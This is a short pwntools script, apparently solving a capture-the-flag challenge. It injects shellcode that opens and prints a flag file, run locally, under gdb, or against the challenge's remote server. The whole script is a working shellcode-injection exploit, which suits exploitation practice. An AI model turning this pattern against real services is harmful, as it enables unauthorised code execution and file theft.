from pwn import *

COMMANDS = """
b main
c
"""
context.arch = "amd64"
len = 0x40

shellcode = shellcraft.amd64.linux.open("/challenge/flag") + shellcraft.amd64.linux.write("rsp", "rax", len) + shellcraft.amd64.linux.write(1, "rsp", len) + """
nop
nop
nop
nop
nop
nop
nop
"""
# print(shellcode)
expl = asm(shellcode)

if args.REMOTE:
    c = remote("open-what-write.ctf.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./open_what_write", gdbscript = COMMANDS)
        # input("Wait")
    else:
        c = process("./open_what_write")

c.recvuntil(b"shellcode: ")
c.send(expl)

c.interactive()